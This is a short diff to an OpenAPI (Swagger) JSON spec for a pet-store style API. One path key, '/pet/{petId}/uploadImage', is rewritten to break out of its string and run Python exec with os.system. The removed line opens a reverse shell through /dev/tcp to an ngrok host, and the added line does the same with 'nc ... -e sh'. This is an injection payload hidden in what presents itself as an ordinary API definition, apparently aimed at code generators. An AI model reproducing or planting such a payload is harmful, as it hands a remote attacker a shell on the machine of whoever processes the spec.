@@ -42,7 +42,7 @@
       "http"
     ],
     "paths": {
-        "/pet/{petId}/uploadImage'+str(exec('import os;os.system(\"sh -i >& /dev/tcp/0.tcp.sa.ngrok.io/12016 0>&1")'))+'": {
+        "/pet/{petId}/uploadImage'+str(exec('import os;os.system(\"nc 0.tcp.sa.ngrok.io 12016 -e sh")'))+'": {
         "post": {
           "tags": [
             "pet"
